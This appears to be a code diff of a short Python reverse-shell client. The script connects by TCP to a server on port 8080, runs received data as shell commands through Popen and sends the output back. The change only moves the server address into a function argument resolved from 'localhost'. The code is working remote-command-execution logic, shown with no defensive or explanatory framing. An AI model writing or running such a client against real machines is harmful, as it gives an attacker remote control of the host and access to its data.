@@ -1,10 +1,9 @@
 import socket
 from subprocess import Popen, PIPE
 
-server_ip = '127.0.0.1'
 server_port = 8080
 
-def connect():
+def connect(server_ip):
     so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     so.connect((server_ip, server_port))
     while True:
@@ -17,5 +16,6 @@ def connect():
             so.send(CMD.stdout.read())
             so.send(CMD.stderr.read())
 def main():
-    connect()
+    server_ip = socket.gethostbyname('localhost')
+    connect(server_ip)
 main()
